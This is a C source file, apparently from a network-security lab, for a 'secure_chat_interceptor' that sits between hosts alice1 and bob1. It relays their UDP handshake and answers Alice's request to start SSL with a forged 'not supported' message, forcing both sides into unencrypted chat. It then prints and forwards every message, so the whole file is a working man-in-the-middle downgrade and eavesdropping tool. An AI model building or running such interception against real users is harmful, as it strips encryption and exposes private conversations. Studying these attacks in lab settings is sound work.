#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/ssl.h>
#include <openssl/opensslv.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <ctype.h>
#include <openssl/x509_vfy.h>
#include <openssl/x509v3.h>
#include <openssl/pem.h>

const int BOB_PORT = 5001; // Will be used to create trudy_alice_socket
int ALICE_PORT = -1;       // Will gets this port no. after receiving chat_hello from alice // This port number will be used to create trudy_bob_socket.

void printLine()
{
    printf("\n--------------------------------------------------\n");
}

char *hostname_to_ip(const char *hostname) {
    struct hostent *host_entry;
    char *ip_address = NULL;

    // Get host entry corresponding to the hostname
    host_entry = gethostbyname(hostname);
    if (host_entry == NULL) {
        fprintf(stderr, "Error occurred in gethostbyname()\n");
        return NULL;
    }

    // Allocate memory for IP address string
    ip_address = (char *)malloc(INET_ADDRSTRLEN);
    if (ip_address == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    // Convert the first IP address to string format
    inet_ntop(AF_INET, host_entry->h_addr_list[0], ip_address, INET_ADDRSTRLEN);
    return ip_address;
}

char *getHostnameOfCurrentSystem()
{
    char *hostname = (char *)malloc(256 * sizeof(char));
    if (hostname == NULL)
    {
        perror("Hostname is NULL");
        exit(1);
    }
    if (gethostname(hostname, 256) != 0)
    {
        perror("gethostname");
        free(hostname);
        exit(1);
    }
    else
    {
        return hostname;
    }
}

int create_trudy_socket(char* TRUDY_IP, int opponentPort)
{
    int trudy_socket;
    struct sockaddr_in trudy_socket_addr;
    memset(&trudy_socket_addr, 0, sizeof(trudy_socket_addr));
    trudy_socket_addr.sin_family = AF_INET;
    inet_pton(AF_INET, TRUDY_IP, &(trudy_socket_addr.sin_addr));
    trudy_socket_addr.sin_port = htons(opponentPort);

    // Create server socket with some options
    if ((trudy_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        perror("trudy socket creation failed");
        exit(EXIT_FAILURE);
    }
    const int one = 1;
    setsockopt(trudy_socket, SOL_SOCKET, SO_REUSEADDR, (const void *)&one, (socklen_t)sizeof(one));
    // Bind server socket to server IP and server port
    if (bind(trudy_socket, (const struct sockaddr *)&trudy_socket_addr, sizeof(trudy_socket_addr)) < 0)
    {
        perror("trudy socket bind failed");
        exit(EXIT_FAILURE);
    }
    return trudy_socket;
}

void eavesdropChat(char* aliceHostname, char* bobHostname) // (char* host1 = alice1, char* host2 = bob1) 
{
    char buffer[4096];
    char* ALICE_IP = hostname_to_ip(aliceHostname);
    char* BOB_IP = hostname_to_ip(bobHostname);
    printf("Alice's IP: %s\n", ALICE_IP);
    printf("Bob's IP: %s\n", BOB_IP);

    char* trudyHostname = getHostnameOfCurrentSystem();
    char* TRUDY_IP = hostname_to_ip(trudyHostname);
    printf("Trudy's IP: %s", TRUDY_IP);

    // 1. creating trudy_alice_socket
    int trudy_alice_socket = create_trudy_socket(TRUDY_IP, BOB_PORT);
    printLine();
    printf("'trudy_alice_socket' socket created Successfully");
    printLine();

    // Now we will wait till alice sends some message to trudy, because after that only we will get the port number of alice
    struct sockaddr_in alice_addr;
    memset(buffer, 0, sizeof(buffer));
    socklen_t alice_addr_size = sizeof(alice_addr);
    printf("Waiting for 'chat_hello' msg from Alice1....\n");
    recvfrom(trudy_alice_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&alice_addr, &alice_addr_size);
    ALICE_PORT = alice_addr.sin_port;
    printf("Msg recvd from %s (%s:%d): %s", aliceHostname, inet_ntoa(alice_addr.sin_addr), ALICE_PORT, buffer);
    if (strcmp(buffer, "chat_hello") != 0)
    {
        printf("\nError: Expected 'chat_hello' message from client\n");
        exit(1);
    }

    // ------------------------------------------------------------------------------------------
    // 2. creating trudy_bob_socket
    int trudy_bob_socket = create_trudy_socket(TRUDY_IP, ALICE_PORT);
    printLine();
    printf("'trudy_bob_socket' socket created Successfully");
    printLine();

    struct sockaddr_in bob_addr;
    memset(&bob_addr, 0, sizeof(bob_addr));
    bob_addr.sin_family = AF_INET;
    inet_pton(AF_INET, BOB_IP, &(bob_addr.sin_addr));
    bob_addr.sin_port = htons(BOB_PORT);

    char *chat_hello = "chat_hello";
    sendto(trudy_bob_socket, (const char *)chat_hello, strlen(chat_hello), 0, (const struct sockaddr *)&bob_addr, sizeof(bob_addr));
    printf("Msg sent to %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, chat_hello);

    memset(buffer, 0, sizeof(buffer));
    socklen_t bob_addr_size = sizeof(bob_addr);
    recvfrom(trudy_bob_socket, (char *)buffer, sizeof(buffer), 0, (struct sockaddr *)&bob_addr, &bob_addr_size);
    printf("Msg recv from %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, buffer);
    if (strcmp(buffer, "chat_ok_reply") != 0)
    {
        printf("\nError: Expected 'chat_ok_reply' message from server\n");
        exit(1);
    }
    
    // 3. Sending the chat_ok_reply to alice1 from trudy1
    char *chat_ok_reply = "chat_ok_reply";
    sendto(trudy_alice_socket, (const char *)chat_ok_reply, strlen(chat_ok_reply), 0, (const struct sockaddr *)&alice_addr, sizeof(alice_addr));
    printf("Msg sent to %s (%s:%d): %s\n", aliceHostname, inet_ntoa(alice_addr.sin_addr), ALICE_PORT, chat_ok_reply);   
    // ------------------------------------------------------------------------------------------

    // 4. Trudy receives 'chat_START_SSL' from alice1
    memset(buffer, 0, sizeof(buffer));
    alice_addr_size = sizeof(alice_addr);
    recvfrom(trudy_alice_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&alice_addr, &alice_addr_size);
    printf("Msg recvd from %s (%s:%d): %s\n", aliceHostname, inet_ntoa(alice_addr.sin_addr), alice_addr.sin_port, buffer);
    if (strcmp(buffer, "chat_START_SSL") != 0)
    {
        printf("\nError: Expected 'chat_START_SSL' message from client\n");
        exit(1);
    }

    // 5. Sending the chat_START_SSL_NOT_SUPPORTED to bob1 from trudy1
    char *chat_START_SSL_NOT_SUPPORTED = "chat_START_SSL_NOT_SUPPORTED";
    sendto(trudy_bob_socket, (const char *)chat_START_SSL_NOT_SUPPORTED, strlen(chat_START_SSL_NOT_SUPPORTED), 0, (const struct sockaddr *)&bob_addr, sizeof(bob_addr));
    //printf("Msg sent to %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, chat_START_SSL_NOT_SUPPORTED);

    // 6. Wainting for 'UNENCRYPTED_CHAT_ACK' message from bob1
    memset(buffer, 0, sizeof(buffer));
    bob_addr_size = sizeof(bob_addr);
    recvfrom(trudy_bob_socket, (char *)buffer, sizeof(buffer), 0, (struct sockaddr *)&bob_addr, &bob_addr_size);
    // printf("Msg recv from %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, buffer);
    if (strcmp(buffer, "UNENCRYPTED_CHAT_ACK") != 0)
    {
        printf("\nError: Expected 'UNENCRYPTED_CHAT_ACK' message from server\n");
        exit(1);
    }

    // 7. Sending 'chat_START_SSL_NOT_SUPPORTED' message to alice1 from trudy1
    sendto(trudy_alice_socket, (const char *)chat_START_SSL_NOT_SUPPORTED, strlen(chat_START_SSL_NOT_SUPPORTED), 0, (const struct sockaddr *)&alice_addr, sizeof(alice_addr));
    printf("Msg sent to %s (%s:%d): %s\n", aliceHostname, inet_ntoa(alice_addr.sin_addr), ALICE_PORT, chat_START_SSL_NOT_SUPPORTED);   

    // Unsecure chat evesdropping will start
    printf("\n******* Evesdropping started ********\n");
    while(1)
    {
        // recv() trudy_alice_socket
        memset(buffer, 0, sizeof(buffer));
        socklen_t alice_addr_size = sizeof(alice_addr);
        recvfrom(trudy_alice_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&alice_addr, &alice_addr_size);
        printf("Msg recvd from %s (%s:%d): %s\n", aliceHostname, inet_ntoa(alice_addr.sin_addr), alice_addr.sin_port, buffer);
       
        // send() trudy_bob_socket
        sendto(trudy_bob_socket, (const char *)buffer, strlen(buffer), 0, (const struct sockaddr *)&bob_addr, sizeof(bob_addr));
        printf("Msg sent to %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, buffer);

        if (strcmp(buffer, "chat_close") == 0) {
            printf("\n******* Chat closed by '%s' ********\n", aliceHostname);
            printLine();
            return;
        }
        printf("\n");
        
        // -------------------------------------------------------------------------------------
        memset(buffer, 0, sizeof(buffer));
        // recv() trudy_bob_socket
        socklen_t bob_addr_size = sizeof(bob_addr);
        recvfrom(trudy_bob_socket, (char *)buffer, sizeof(buffer), 0, (struct sockaddr *)&bob_addr, &bob_addr_size);
        printf("Msg recv from %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, buffer);
        
        // send() trudy_alice_socket
        sendto(trudy_alice_socket, (const char *)buffer, strlen(buffer), 0, (const struct sockaddr *)&alice_addr, sizeof(alice_addr));
        printf("Msg sent to %s (%s:%d): %s\n", aliceHostname, inet_ntoa(alice_addr.sin_addr), ALICE_PORT, buffer);

        if (strcmp(buffer, "chat_close") == 0) {
            printf("\n******* Chat closed by '%s' ********\n", bobHostname);
            printLine();
            return;
        }
        printf("\n");
    }
}

int main(int argc, char *argv[])
{
    OpenSSL_add_ssl_algorithms();
    SSL_load_error_strings();
    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc == 4)
    {
        while(1)
        {
            eavesdropChat(argv[2], argv[3]);  // argv[2] = alice1, argv[3] = bob1
        }
        
    }
    else
    {
        printf("Wrong command!\n");
        printf("Correct cmd to run Interceptor: ./secure_chat_interceptor -d alice1 bob1\n");
        exit(1);
    }
    return 0;
}

// gcc -o secure_chat_interceptor secure_chat_interceptor.c -lssl -lcrypto -Wno-deprecated-declarations
// ./secure_chat_interceptor -d alice1 bob1
